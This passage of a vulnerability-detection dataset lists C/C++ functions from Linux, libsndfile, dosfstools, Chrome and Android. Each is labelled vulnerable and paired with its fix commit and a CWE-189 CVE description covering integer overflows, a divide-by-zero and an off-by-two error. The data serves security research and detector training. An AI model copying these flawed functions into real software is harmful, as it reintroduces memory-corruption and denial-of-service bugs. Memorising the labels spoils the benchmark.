{\n\t\t\trc = -EFAULT;\n\t\t\tgoto out_free_buffer;\n\t\t}\n\t} else if (request_size < 0) {\n\t\trc = -EINVAL;\n\t\tgoto out_free_buffer;\n\t}\n\n\t/* check if we have any additional command parameters */\n\tif (buffer->ioarcb.add_cmd_param_length > PMCRAID_ADD_CMD_PARAM_LEN) {\n\t\trc = -EINVAL;\n\t\tgoto out_free_buffer;\n\t}\n\n\tcmd = pmcraid_get_free_cmd(pinstance);\n\n\tif (!cmd) {\n\t\tpmcraid_err(\"free command block is not available\\n\");\n\t\trc = -ENOMEM;\n\t\tgoto out_free_buffer;\n\t}\n\n\tcmd->scsi_cmd = NULL;\n\tioarcb = &(cmd->ioa_cb->ioarcb);\n\n\t/* Copy the user-provided IOARCB stuff field by field */\n\tioarcb->resource_handle = buffer->ioarcb.resource_handle;\n\tioarcb->data_transfer_length = buffer->ioarcb.data_transfer_length;\n\tioarcb->cmd_timeout = buffer->ioarcb.cmd_timeout;\n\tioarcb->request_type = buffer->ioarcb.request_type;\n\tioarcb->request_flags0 = buffer->ioarcb.request_flags0;\n\tioarcb->request_flags1 = buffer->ioarcb.request_flags1;\n\tmemcpy(ioarcb->cdb, buffer->ioarcb.cdb, PMCRAID_MAX_CDB_LEN);\n\n\tif (buffer->ioarcb.add_cmd_param_length) {\n\t\tioarcb->add_cmd_param_length =\n\t\t\tbuffer->ioarcb.add_cmd_param_length;\n\t\tioarcb->add_cmd_param_offset =\n\t\t\tbuffer->ioarcb.add_cmd_param_offset;\n\t\tmemcpy(ioarcb->add_data.u.add_cmd_params,\n\t\t\tbuffer->ioarcb.add_data.u.add_cmd_params,\n\t\t\tbuffer->ioarcb.add_cmd_param_length);\n\t}\n\n\t/* set hrrq number where the IOA should respond to. Note that all cmds\n\t * generated internally uses hrrq_id 0, exception to this is the cmd\n\t * block of scsi_cmd which is re-used (e.g. cancel/abort), which uses\n\t * hrrq_id assigned here in queuecommand\n\t */\n\tioarcb->hrrq_id = atomic_add_return(1, &(pinstance->last_message_id)) %\n\t\t\t  pinstance->num_hrrq;\n\n\tif (request_size) {\n\t\trc = pmcraid_build_passthrough_ioadls(cmd,\n\t\t\t\t\t\t      request_size,\n\t\t\t\t\t\t      direction);\n\t\tif (rc) {\n \t\t\tpmcraid_err(\"couldn't build passthrough ioadls\\n\");\n \t\t\tgoto out_free_buffer;\n \t\t}\n \t}\n \n \t/* If data is being written into the device, copy the data from user\n\t * buffers\n\t */\n\tif (direction == DMA_TO_DEVICE && request_size > 0) {\n\t\trc = pmcraid_copy_sglist(cmd->sglist,\n\t\t\t\t\t request_buffer,\n\t\t\t\t\t request_size,\n\t\t\t\t\t direction);\n\t\tif (rc) {\n\t\t\tpmcraid_err(\"failed to copy user buffer\\n\");\n\t\t\tgoto out_free_sglist;\n\t\t}\n\t}\n\n\t/* passthrough ioctl is a blocking command so, put the user to sleep\n\t * until timeout. Note that a timeout value of 0 means, do timeout.\n\t */\n\tcmd->cmd_done = pmcraid_internal_done;\n\tinit_completion(&cmd->wait_for_completion);\n\tcmd->completion_req = 1;\n\n\tpmcraid_info(\"command(%d) (CDB[0] = %x) for %x\\n\",\n\t\t     le32_to_cpu(cmd->ioa_cb->ioarcb.response_handle) >> 2,\n\t\t     cmd->ioa_cb->ioarcb.cdb[0],\n\t\t     le32_to_cpu(cmd->ioa_cb->ioarcb.resource_handle));\n\n\tspin_lock_irqsave(pinstance->host->host_lock, lock_flags);\n\t_pmcraid_fire_command(cmd);\n\tspin_unlock_irqrestore(pinstance->host->host_lock, lock_flags);\n\n\t/* NOTE ! Remove the below line once abort_task is implemented\n\t * in firmware. This line disables ioctl command timeout handling logic\n\t * similar to IO command timeout handling, making ioctl commands to wait\n\t * until the command completion regardless of timeout value specified in\n\t * ioarcb\n\t */\n\tbuffer->ioarcb.cmd_timeout = 0;\n\n\t/* If command timeout is specified put caller to wait till that time,\n\t * otherwise it would be blocking wait. If command gets timed out, it\n\t * will be aborted.\n\t */\n\tif (buffer->ioarcb.cmd_timeout == 0) {\n\t\twait_for_completion(&cmd->wait_for_completion);\n\t} else if (!wait_for_completion_timeout(\n\t\t\t&cmd->wait_for_completion,\n\t\t\tmsecs_to_jiffies(buffer->ioarcb.cmd_timeout * 1000))) {\n\n\t\tpmcraid_info(\"aborting cmd %d (CDB[0] = %x) due to timeout\\n\",\n\t\t\tle32_to_cpu(cmd->ioa_cb->ioarcb.response_handle >> 2),\n\t\t\tcmd->ioa_cb->ioarcb.cdb[0]);\n\n\t\tspin_lock_irqsave(pinstance->host->host_lock, lock_flags);\n\t\tcancel_cmd = pmcraid_abort_cmd(cmd);\n\t\tspin_unlock_irqrestore(pinstance->host->host_lock, lock_flags);\n\n\t\tif (cancel_cmd) {\n\t\t\twait_for_completion(&cancel_cmd->wait_for_completion);\n\t\t\tioasc = cancel_cmd->ioa_cb->ioasa.ioasc;\n\t\t\tpmcraid_return_cmd(cancel_cmd);\n\n\t\t\t/* if abort task couldn't find the command i.e it got\n\t\t\t * completed prior to aborting, return good completion.\n\t\t\t * if command got aborted successfully or there was IOA\n\t\t\t * reset due to abort task itself getting timedout then\n\t\t\t * return -ETIMEDOUT\n\t\t\t */\n\t\t\tif (ioasc == PMCRAID_IOASC_IOA_WAS_RESET ||\n\t\t\t    PMCRAID_IOASC_SENSE_KEY(ioasc) == 0x00) {\n\t\t\t\tif (ioasc != PMCRAID_IOASC_GC_IOARCB_NOTFOUND)\n\t\t\t\t\trc = -ETIMEDOUT;\n\t\t\t\tgoto out_handle_response;\n\t\t\t}\n\t\t}\n\n\t\t/* no command block for abort task or abort task failed to abort\n\t\t * the IOARCB, then wait for 150 more seconds and initiate reset\n\t\t * sequence after timeout\n\t\t */\n\t\tif (!wait_for_completion_timeout(\n\t\t\t&cmd->wait_for_completion,\n\t\t\tmsecs_to_jiffies(150 * 1000))) {\n\t\t\tpmcraid_reset_bringup(cmd->drv_inst);\n\t\t\trc = -ETIMEDOUT;\n\t\t}\n\t}\n\nout_handle_response:\n\t/* copy entire IOASA buffer and return IOCTL success.\n\t * If copying IOASA to user-buffer fails, return\n\t * EFAULT\n\t */\n\tif (copy_to_user(ioasa, &cmd->ioa_cb->ioasa,\n\t\tsizeof(struct pmcraid_ioasa))) {\n\t\tpmcraid_err(\"failed to copy ioasa buffer to user\\n\");\n\t\trc = -EFAULT;\n\t}\n\n\t/* If the data transfer was from device, copy the data onto user\n\t * buffers\n\t */\n\telse if (direction == DMA_FROM_DEVICE && request_size > 0) {\n\t\trc = pmcraid_copy_sglist(cmd->sglist,\n\t\t\t\t\t request_buffer,\n\t\t\t\t\t request_size,\n\t\t\t\t\t direction);\n\t\tif (rc) {\n\t\t\tpmcraid_err(\"failed to copy user buffer\\n\");\n\t\t\trc = -EFAULT;\n\t\t}\n\t}\n\nout_free_sglist:\n\tpmcraid_release_passthrough_ioadls(cmd, request_size, direction);\n\tpmcraid_return_cmd(cmd);\n\nout_free_buffer:\n\tkfree(buffer);\n\n\treturn rc;\n}\n", "func_hash": 295586048330353887553455689305190810232, "file_name": "pmcraid.c", "file_hash": 89935499371944196984185789189057983187, "cwe": ["CWE-189"], "cve": "CVE-2011-2906", "cve_desc": "Integer signedness error in the pmcraid_ioctl_passthrough function in drivers/scsi/pmcraid.c in the Linux kernel before 3.1 might allow local users to cause a denial of service (memory consumption or memory corruption) via a negative size value in an ioctl call. NOTE: this may be a vulnerability only in unusual environments that provide a privileged program for obtaining the required file descriptor.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-2906"}
{"idx": 9218, "project": "linux", "commit_id": "982134ba62618c2d69fbbbd166d0a11ee3b7e3d8", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/982134ba62618c2d69fbbbd166d0a11ee3b7e3d8", "commit_message": "mm: avoid wrapping vm_pgoff in mremap()\n\nThe normal mmap paths all avoid creating a mapping where the pgoff\ninside the mapping could wrap around due to overflow.  However, an\nexpanding mremap() can take such a non-wrapping mapping and make it\nbigger and cause a wrapping condition.\n\nNoticed by Robert Swiecki when running a system call fuzzer, where it\ncaused a BUG_ON() due to terminally confusing the vma_prio_tree code.  A\nvma dumping patch by Hugh then pinpointed the crazy wrapped case.\n\nReported-and-tested-by: Robert Swiecki <robert@swiecki.net>\nAcked-by: Hugh Dickins <hughd@google.com>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>", "target": 1, "func": "static struct vm_area_struct *vma_to_resize(unsigned long addr,\n\tunsigned long old_len, unsigned long new_len, unsigned long *p)\n{\n\tstruct mm_struct *mm = current->mm;\n\tstruct vm_area_struct *vma = find_vma(mm, addr);\n\n\tif (!vma || vma->vm_start > addr)\n\t\tgoto Efault;\n\n\tif (is_vm_hugetlb_page(vma))\n\t\tgoto Einval;\n\n\t/* We can't remap across vm area boundaries */\n \tif (old_len > vma->vm_end - addr)\n \t\tgoto Efault;\n \n\tif (vma->vm_flags & (VM_DONTEXPAND | VM_PFNMAP)) {\n\t\tif (new_len > old_len)\n \t\t\tgoto Efault;\n \t}\n \n \tif (vma->vm_flags & VM_LOCKED) {\n\t\tunsigned long locked, lock_limit;\n\t\tlocked = mm->locked_vm << PAGE_SHIFT;\n\t\tlock_limit = rlimit(RLIMIT_MEMLOCK);\n\t\tlocked += new_len - old_len;\n\t\tif (locked > lock_limit && !capable(CAP_IPC_LOCK))\n\t\t\tgoto Eagain;\n\t}\n\n\tif (!may_expand_vm(mm, (new_len - old_len) >> PAGE_SHIFT))\n\t\tgoto Enomem;\n\n\tif (vma->vm_flags & VM_ACCOUNT) {\n\t\tunsigned long charged = (new_len - old_len) >> PAGE_SHIFT;\n\t\tif (security_vm_enough_memory(charged))\n\t\t\tgoto Efault;\n\t\t*p = charged;\n\t}\n\n\treturn vma;\n\nEfault:\t/* very odd choice for most of the cases, but... */\n\treturn ERR_PTR(-EFAULT);\nEinval:\n\treturn ERR_PTR(-EINVAL);\nEnomem:\n\treturn ERR_PTR(-ENOMEM);\nEagain:\n\treturn ERR_PTR(-EAGAIN);\n}\n", "func_hash": 292133340135753070222274986926337714178, "file_name": "mremap.c", "file_hash": 177081935139407066890129727035267837255, "cwe": ["CWE-189"], "cve": "CVE-2011-2496", "cve_desc": "Integer overflow in the vma_to_resize function in mm/mremap.c in the Linux kernel before 2.6.39 allows local users to cause a denial of service (BUG_ON and system crash) via a crafted mremap system call that expands a memory mapping.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-2496"}
{"idx": 9310, "project": "libsndfile", "commit_id": "725c7dbb95bfaf8b4bb7b04820e3a00cceea9ce6", "project_url": "https://github.com/erikd/libsndfile", "commit_url": "https://github.com/erikd/libsndfile/commit/725c7dbb95bfaf8b4bb7b04820e3a00cceea9ce6", "commit_message": "src/file_io.c : Prevent potential divide-by-zero.\n\nCloses: https://github.com/erikd/libsndfile/issues/92", "target": 1, "func": "psf_fwrite (const void *ptr, sf_count_t bytes, sf_count_t items, SF_PRIVATE *psf)\n {\tsf_count_t total = 0 ;\n \tssize_t\tcount ;\n \n \tif (psf->virtual_io)\n \t\treturn psf->vio.write (ptr, bytes*items, psf->vio_user_data) / bytes ;\n \n\titems *= bytes ;\n\n\t/* Do this check after the multiplication above. */\n\tif (items <= 0)\n\t\treturn 0 ;\n\n\twhile (items > 0)\n\t{\t/* Break the writes down to a sensible size. */\n\t\tcount = (items > SENSIBLE_SIZE) ? SENSIBLE_SIZE : items ;\n\n\t\tcount = write (psf->file.filedes, ((const char*) ptr) + total, count) ;\n\n\t\tif (count == -1)\n\t\t{\tif (errno == EINTR)\n\t\t\t\tcontinue ;\n\n\t\t\tpsf_log_syserr (psf, errno) ;\n\t\t\tbreak ;\n\t\t\t} ;\n\n\t\tif (count == 0)\n\t\t\tbreak ;\n\n\t\ttotal += count ;\n\t\titems -= count ;\n\t\t} ;\n\n\tif (psf->is_pipe)\n\t\tpsf->pipeoffset += total ;\n\n\treturn total / bytes ;\n} /* psf_fwrite */\n", "func_hash": 168840506501797735728922334619912865145, "file_name": "file_io.c", "file_hash": 239890201875820398698693733615353153940, "cwe": ["CWE-189"], "cve": "CVE-2014-9756", "cve_desc": "The psf_fwrite function in file_io.c in libsndfile allows attackers to cause a denial of service (divide-by-zero error and application crash) via unspecified vectors related to the headindex variable.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-9756"}
{"idx": 9392, "project": "dosfstools", "commit_id": "07908124838afcc99c577d1d3e84cef2dbd39cb7", "project_url": "https://github.com/dosfstools/dosfstools", "commit_url": "https://github.com/dosfstools/dosfstools/commit/07908124838afcc99c577d1d3e84cef2dbd39cb7", "commit_message": "set_fat(): Fix off-by-2 error leading to corruption in FAT12\n\nIn FAT12 two 12 bit entries are combined to a 24 bit value (three\nbytes). Therefore, when an even numbered FAT entry is set in FAT12, it\nmust be be combined with the following entry. To prevent accessing\nbeyond the end of the FAT array, it must be checked that the cluster is\nnot the last one.\n\nPreviously, the check tested that the requested cluster was equal to\nfs->clusters - 1. However, fs->clusters is the number of data clusters\nnot including the two reserved FAT entries at the start so the test\ntriggered two clusters early.\n\nIf the third to last entry was written on a FAT12 filesystem with an\nodd number of clusters, the second to last entry would be corrupted.\nThis corruption may also lead to invalid memory accesses when the\ncorrupted entry becomes out of bounds and is used later.\n\nChange the test to fs->clusters + 1 to fix.\n\nReported-by: Hanno Bck\nSigned-off-by: Andreas Bombe <aeb@debian.org>", "target": 1, "func": "void set_fat(DOS_FS * fs, uint32_t cluster, int32_t new)\n{\n    unsigned char *data = NULL;\n    int size;\n    loff_t offs;\n\n    if (new == -1)\n\tnew = FAT_EOF(fs);\n    else if ((long)new == -2)\n\tnew = FAT_BAD(fs);\n    switch (fs->fat_bits) {\n    case 12:\n\tdata = fs->fat + cluster * 3 / 2;\n\toffs = fs->fat_start + cluster * 3 / 2;\n\tif (cluster & 1) {\n\t    FAT_ENTRY prevEntry;\n\t    get_fat(&prevEntry, fs->fat, cluster - 1, fs);\n\t    data[0] = ((new & 0xf) << 4) | (prevEntry.value >> 8);\n \t    data[1] = new >> 4;\n \t} else {\n \t    FAT_ENTRY subseqEntry;\n\t    if (cluster != fs->clusters - 1)\n \t\tget_fat(&subseqEntry, fs->fat, cluster + 1, fs);\n \t    else\n \t\tsubseqEntry.value = 0;\n\t    data[0] = new & 0xff;\n\t    data[1] = (new >> 8) | ((0xff & subseqEntry.value) << 4);\n\t}\n\tsize = 2;\n\tbreak;\n    case 16:\n\tdata = fs->fat + cluster * 2;\n\toffs = fs->fat_start + cluster * 2;\n\t*(unsigned short *)data = htole16(new);\n\tsize = 2;\n\tbreak;\n    case 32:\n\t{\n\t    FAT_ENTRY curEntry;\n\t    get_fat(&curEntry, fs->fat, cluster, fs);\n\n\t    data = fs->fat + cluster * 4;\n\t    offs = fs->fat_start + cluster * 4;\n\t    /* According to M$, the high 4 bits of a FAT32 entry are reserved and\n\t     * are not part of the cluster number. So we never touch them. */\n\t    *(uint32_t *)data = htole32((new & 0xfffffff) |\n\t\t\t\t\t     (curEntry.reserved << 28));\n\t    size = 4;\n\t}\n\tbreak;\n    default:\n\tdie(\"Bad FAT entry size: %d bits.\", fs->fat_bits);\n    }\n    fs_write(offs, size, data);\n    if (fs->nfats > 1) {\n\tfs_write(offs + fs->fat_size, size, data);\n    }\n}\n", "func_hash": 55173971612937988226139986977384850916, "file_name": "fat.c", "file_hash": 15574431569440081692242501913260158629, "cwe": ["CWE-189"], "cve": "CVE-2015-8872", "cve_desc": "The set_fat function in fat.c in dosfstools before 4.0 might allow attackers to corrupt a FAT12 filesystem or cause a denial of service (invalid memory read and crash) by writing an odd number of clusters to the third to last entry on a FAT12 filesystem, which triggers an \"off-by-two error.\"", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-8872"}
{"idx": 9903, "project": "Chrome", "commit_id": "b2006ac87cec58363090e7d5e10d5d9e3bbda9f9", "project_url": "https://github.com/chromium/chromium", "commit_url": "https://github.com/chromium/chromium/commit/b2006ac87cec58363090e7d5e10d5d9e3bbda9f9", "commit_message": "None", "target": 1, "func": "static bool CheckMov(const uint8* buffer, int buffer_size) {\n  RCHECK(buffer_size > 8);\n \n   int offset = 0;\n   while (offset + 8 < buffer_size) {\n    int atomsize = Read32(buffer + offset);\n     uint32 atomtype = Read32(buffer + offset + 4);\n     switch (atomtype) {\n      case TAG('f','t','y','p'):\n      case TAG('p','d','i','n'):\n      case TAG('m','o','o','v'):\n      case TAG('m','o','o','f'):\n      case TAG('m','f','r','a'):\n      case TAG('m','d','a','t'):\n      case TAG('f','r','e','e'):\n      case TAG('s','k','i','p'):\n      case TAG('m','e','t','a'):\n      case TAG('m','e','c','o'):\n      case TAG('s','t','y','p'):\n      case TAG('s','i','d','x'):\n      case TAG('s','s','i','x'):\n      case TAG('p','r','f','t'):\n      case TAG('b','l','o','c'):\n        break;\n      default:\n        return false;\n    }\n    if (atomsize == 1) {\n      if (offset + 16 > buffer_size)\n        break;\n      if (Read32(buffer + offset + 8) != 0)\n         break;  // Offset is way past buffer size.\n       atomsize = Read32(buffer + offset + 12);\n     }\n    if (atomsize <= 0)\n       break;  // Indicates the last atom or length too big.\n     offset += atomsize;\n   }\n  return true;\n}\n", "func_hash": 82572215792595663465898448627607146335, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2014-7908", "cve_desc": "Multiple integer overflows in the CheckMov function in media/base/container_names.cc in Google Chrome before 39.0.2171.65 allow remote attackers to cause a denial of service or possibly have unspecified other impact via a large atom in (1) MPEG-4 or (2) QuickTime .mov data.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-7908"}
{"idx": 10125, "project": "Android", "commit_id": "6fe85f7e15203e48df2cc3e8e1c4bc6ad49dc968", "project_url": "None", "commit_url": "https://android.googlesource.com/platform/frameworks/av/+/6fe85f7e15203e48df2cc3e8e1c4bc6ad49dc968", "commit_message": "None", "target": 1, "func": "status_t MPEG4Extractor::parseChunk(off64_t *offset, int depth) {\n    ALOGV(\"entering parseChunk %lld/%d\", *offset, depth);\n uint32_t hdr[2];\n if (mDataSource->readAt(*offset, hdr, 8) < 8) {\n return ERROR_IO;\n }\n uint64_t chunk_size = ntohl(hdr[0]);\n uint32_t chunk_type = ntohl(hdr[1]);\n off64_t data_offset = *offset + 8;\n\n if (chunk_size == 1) {\n if (mDataSource->readAt(*offset + 8, &chunk_size, 8) < 8) {\n return ERROR_IO;\n }\n        chunk_size = ntoh64(chunk_size);\n        data_offset += 8;\n\n if (chunk_size < 16) {\n return ERROR_MALFORMED;\n }\n } else if (chunk_size == 0) {\n if (depth == 0) {\n off64_t sourceSize;\n if (mDataSource->getSize(&sourceSize) == OK) {\n                chunk_size = (sourceSize - *offset);\n } else {\n                ALOGE(\"atom size is 0, and data source has no size\");\n return ERROR_MALFORMED;\n }\n } else {\n *offset += 4;\n return OK;\n }\n } else if (chunk_size < 8) {\n        ALOGE(\"invalid chunk size: %\" PRIu64, chunk_size);\n return ERROR_MALFORMED;\n }\n\n char chunk[5];\n MakeFourCCString(chunk_type, chunk);\n    ALOGV(\"chunk: %s @ %lld, %d\", chunk, *offset, depth);\n\n#if 0\n static const char kWhitespace[] = \"                                        \";\n const char *indent = &kWhitespace[sizeof(kWhitespace) - 1 - 2 * depth];\n    printf(\"%sfound chunk '%s' of size %\" PRIu64 \"\\n\", indent, chunk, chunk_size);\n\n char buffer[256];\n size_t n = chunk_size;\n if (n > sizeof(buffer)) {\n        n = sizeof(buffer);\n }\n if (mDataSource->readAt(*offset, buffer, n)\n < (ssize_t)n) {\n return ERROR_IO;\n }\n\n    hexdump(buffer, n);\n#endif\n\n PathAdder autoAdder(&mPath, chunk_type);\n\n off64_t chunk_data_size = *offset + chunk_size - data_offset;\n\n if (chunk_type != FOURCC('c', 'p', 'r', 't')\n && chunk_type != FOURCC('c', 'o', 'v', 'r')\n && mPath.size() == 5 && underMetaDataPath(mPath)) {\n off64_t stop_offset = *offset + chunk_size;\n *offset = data_offset;\n while (*offset < stop_offset) {\n status_t err = parseChunk(offset, depth + 1);\n if (err != OK) {\n return err;\n }\n }\n\n if (*offset != stop_offset) {\n return ERROR_MALFORMED;\n }\n\n return OK;\n }\n\n switch(chunk_type) {\n case FOURCC('m', 'o', 'o', 'v'):\n case FOURCC('t', 'r', 'a', 'k'):\n case FOURCC('m', 'd', 'i', 'a'):\n case FOURCC('m', 'i', 'n', 'f'):\n case FOURCC('d', 'i', 'n', 'f'):\n case FOURCC('s', 't', 'b', 'l'):\n case FOURCC('m', 'v', 'e', 'x'):\n case FOURCC('m', 'o', 'o', 'f'):\n case FOURCC('t', 'r', 'a', 'f'):\n case FOURCC('m', 'f', 'r', 'a'):\n case FOURCC('u', 'd', 't', 'a'):\n case FOURCC('i', 'l', 's', 't'):\n case FOURCC('s', 'i', 'n', 'f'):\n case FOURCC('s', 'c', 'h', 'i'):\n case FOURCC('e', 'd', 't', 's'):\n {\n if (chunk_type == FOURCC('s', 't', 'b', 'l')) {\n                ALOGV(\"sampleTable chunk is %\" PRIu64 \" bytes long.\", chunk_size);\n\n if (mDataSource->flags()\n & (DataSource::kWantsPrefetching\n | DataSource::kIsCachingDataSource)) {\n                    sp<MPEG4DataSource> cachedSource =\n new MPEG4DataSource(mDataSource);\n\n if (cachedSource->setCachedRange(*offset, chunk_size) == OK) {\n                        mDataSource = cachedSource;\n }\n }\n\n                mLastTrack->sampleTable = new SampleTable(mDataSource);\n }\n\n bool isTrack = false;\n if (chunk_type == FOURCC('t', 'r', 'a', 'k')) {\n                isTrack = true;\n\n Track *track = new Track;\n                track->next = NULL;\n if (mLastTrack) {\n                    mLastTrack->next = track;\n } else {\n                    mFirstTrack = track;\n }\n                mLastTrack = track;\n\n                track->meta = new MetaData;\n                track->includes_expensive_metadata = false;\n                track->skipTrack = false;\n                track->timescale = 0;\n                track->meta->setCString(kKeyMIMEType, \"application/octet-stream\");\n }\n\n off64_t stop_offset = *offset + chunk_size;\n *offset = data_offset;\n while (*offset < stop_offset) {\n status_t err = parseChunk(offset, depth + 1);\n if (err != OK) {\n return err;\n }\n }\n\n if (*offset != stop_offset) {\n return ERROR_MALFORMED;\n }\n\n if (isTrack) {\n if (mLastTrack->skipTrack) {\n Track *cur = mFirstTrack;\n\n if (cur == mLastTrack) {\n delete cur;\n                        mFirstTrack = mLastTrack = NULL;\n } else {\n while (cur && cur->next != mLastTrack) {\n                            cur = cur->next;\n }\n                        cur->next = NULL;\n delete mLastTrack;\n                        mLastTrack = cur;\n }\n\n return OK;\n }\n\n status_t err = verifyTrack(mLastTrack);\n\n if (err != OK) {\n return err;\n }\n } else if (chunk_type == FOURCC('m', 'o', 'o', 'v')) {\n                mInitCheck = OK;\n\n if (!mIsDrm) {\n return UNKNOWN_ERROR; // Return a dummy error.\n } else {\n return OK;\n }\n }\n break;\n }\n\n case FOURCC('e', 'l', 's', 't'):\n {\n *offset += chunk_size;\n\n uint8_t version;\n if (mDataSource->readAt(data_offset, &version, 1) < 1) {\n return ERROR_IO;\n }\n\n uint32_t entry_count;\n if (!mDataSource->getUInt32(data_offset + 4, &entry_count)) {\n return ERROR_IO;\n }\n\n if (entry_count != 1) {\n                ALOGW(\"ignoring edit list with %d entries\", entry_count);\n } else if (mHeaderTimescale == 0) {\n                ALOGW(\"ignoring edit list because timescale is 0\");\n } else {\n off64_t entriesoffset = data_offset + 8;\n uint64_t segment_duration;\n int64_t media_time;\n\n if (version == 1) {\n if (!mDataSource->getUInt64(entriesoffset, &segment_duration) ||\n !mDataSource->getUInt64(entriesoffset + 8, (uint64_t*)&media_time)) {\n return ERROR_IO;\n }\n } else if (version == 0) {\n uint32_t sd;\n int32_t mt;\n if (!mDataSource->getUInt32(entriesoffset, &sd) ||\n !mDataSource->getUInt32(entriesoffset + 4, (uint32_t*)&mt)) {\n return ERROR_IO;\n }\n                    segment_duration = sd;\n                    media_time = mt;\n } else {\n return ERROR_IO;\n }\n\n uint64_t halfscale = mHeaderTimescale / 2;\n                segment_duration = (segment_duration * 1000000 + halfscale)/ mHeaderTimescale;\n                media_time = (media_time * 1000000 + halfscale) / mHeaderTimescale;\n\n int64_t duration;\n int32_t samplerate;\n if (!mLastTrack) {\n return ERROR_MALFORMED;\n }\n if (mLastTrack->meta->findInt64(kKeyDuration, &duration) &&\n                        mLastTrack->meta->findInt32(kKeySampleRate, &samplerate)) {\n\n int64_t delay = (media_time  * samplerate + 500000) / 1000000;\n                    mLastTrack->meta->setInt32(kKeyEncoderDelay, delay);\n\n int64_t paddingus = duration - (segment_duration + media_time);\n if (paddingus < 0) {\n                        paddingus = 0;\n }\n int64_t paddingsamples = (paddingus * samplerate + 500000) / 1000000;\n                    mLastTrack->meta->setInt32(kKeyEncoderPadding, paddingsamples);\n }\n }\n break;\n }\n\n case FOURCC('f', 'r', 'm', 'a'):\n {\n *offset += chunk_size;\n\n uint32_t original_fourcc;\n if (mDataSource->readAt(data_offset, &original_fourcc, 4) < 4) {\n return ERROR_IO;\n }\n            original_fourcc = ntohl(original_fourcc);\n            ALOGV(\"read original format: %d\", original_fourcc);\n            mLastTrack->meta->setCString(kKeyMIMEType, FourCC2MIME(original_fourcc));\n uint32_t num_channels = 0;\n uint32_t sample_rate = 0;\n if (AdjustChannelsAndRate(original_fourcc, &num_channels, &sample_rate)) {\n                mLastTrack->meta->setInt32(kKeyChannelCount, num_channels);\n                mLastTrack->meta->setInt32(kKeySampleRate, sample_rate);\n }\n break;\n }\n\n case FOURCC('t', 'e', 'n', 'c'):\n {\n *offset += chunk_size;\n\n if (chunk_size < 32) {\n return ERROR_MALFORMED;\n }\n\n char buf[4];\n            memset(buf, 0, 4);\n if (mDataSource->readAt(data_offset + 4, buf + 1, 3) < 3) {\n return ERROR_IO;\n }\n uint32_t defaultAlgorithmId = ntohl(*((int32_t*)buf));\n if (defaultAlgorithmId > 1) {\n return ERROR_MALFORMED;\n }\n\n            memset(buf, 0, 4);\n if (mDataSource->readAt(data_offset + 7, buf + 3, 1) < 1) {\n return ERROR_IO;\n }\n uint32_t defaultIVSize = ntohl(*((int32_t*)buf));\n\n if ((defaultAlgorithmId == 0 && defaultIVSize != 0) ||\n (defaultAlgorithmId != 0 && defaultIVSize == 0)) {\n return ERROR_MALFORMED;\n } else if (defaultIVSize != 0 &&\n                    defaultIVSize != 8 &&\n                    defaultIVSize != 16) {\n return ERROR_MALFORMED;\n }\n\n uint8_t defaultKeyId[16];\n\n if (mDataSource->readAt(data_offset + 8, &defaultKeyId, 16) < 16) {\n return ERROR_IO;\n }\n\n            mLastTrack->meta->setInt32(kKeyCryptoMode, defaultAlgorithmId);\n            mLastTrack->meta->setInt32(kKeyCryptoDefaultIVSize, defaultIVSize);\n            mLastTrack->meta->setData(kKeyCryptoKey, 'tenc', defaultKeyId, 16);\n break;\n }\n\n case FOURCC('t', 'k', 'h', 'd'):\n {\n *offset += chunk_size;\n\n status_t err;\n if ((err = parseTrackHeader(data_offset, chunk_data_size)) != OK) {\n return err;\n }\n\n break;\n }\n\n case FOURCC('p', 's', 's', 'h'):\n {\n *offset += chunk_size;\n\n PsshInfo pssh;\n\n if (mDataSource->readAt(data_offset + 4, &pssh.uuid, 16) < 16) {\n return ERROR_IO;\n }\n\n uint32_t psshdatalen = 0;\n if (mDataSource->readAt(data_offset + 20, &psshdatalen, 4) < 4) {\n return ERROR_IO;\n }\n            pssh.datalen = ntohl(psshdatalen);\n            ALOGV(\"pssh data size: %d\", pssh.datalen);\n if (pssh.datalen + 20 > chunk_size) {\n return ERROR_MALFORMED;\n }\n\n            pssh.data = new (std::nothrow) uint8_t[pssh.datalen];\n if (pssh.data == NULL) {\n return ERROR_MALFORMED;\n }\n            ALOGV(\"allocated pssh @ %p\", pssh.data);\n ssize_t requested = (ssize_t) pssh.datalen;\n if (mDataSource->readAt(data_offset + 24, pssh.data, requested) < requested) {\n return ERROR_IO;\n }\n            mPssh.push_back(pssh);\n\n break;\n }\n\n case FOURCC('m', 'd', 'h', 'd'):\n {\n *offset += chunk_size;\n\n if (chunk_data_size < 4 || mLastTrack == NULL) {\n return ERROR_MALFORMED;\n }\n\n uint8_t version;\n if (mDataSource->readAt(\n                        data_offset, &version, sizeof(version))\n < (ssize_t)sizeof(version)) {\n return ERROR_IO;\n }\n\n off64_t timescale_offset;\n\n if (version == 1) {\n                timescale_offset = data_offset + 4 + 16;\n } else if (version == 0) {\n                timescale_offset = data_offset + 4 + 8;\n } else {\n return ERROR_IO;\n }\n\n uint32_t timescale;\n if (mDataSource->readAt(\n                        timescale_offset, &timescale, sizeof(timescale))\n < (ssize_t)sizeof(timescale)) {\n return ERROR_IO;\n }\n\n            mLastTrack->timescale = ntohl(timescale);\n\n int64_t duration = 0;\n if (version == 1) {\n if (mDataSource->readAt(\n                            timescale_offset + 4, &duration, sizeof(duration))\n < (ssize_t)sizeof(duration)) {\n return ERROR_IO;\n }\n if (duration != -1) {\n                    duration = ntoh64(duration);\n }\n } else {\n uint32_t duration32;\n if (mDataSource->readAt(\n                            timescale_offset + 4, &duration32, sizeof(duration32))\n < (ssize_t)sizeof(duration32)) {\n return ERROR_IO;\n }\n if (duration32 != 0xffffffff) {\n                    duration = ntohl(duration32);\n }\n }\n if (duration != 0) {\n                mLastTrack->meta->setInt64(\n                        kKeyDuration, (duration * 1000000) / mLastTrack->timescale);\n }\n\n uint8_t lang[2];\n off64_t lang_offset;\n if (version == 1) {\n                lang_offset = timescale_offset + 4 + 8;\n } else if (version == 0) {\n                lang_offset = timescale_offset + 4 + 4;\n } else {\n return ERROR_IO;\n }\n\n if (mDataSource->readAt(lang_offset, &lang, sizeof(lang))\n < (ssize_t)sizeof(lang)) {\n return 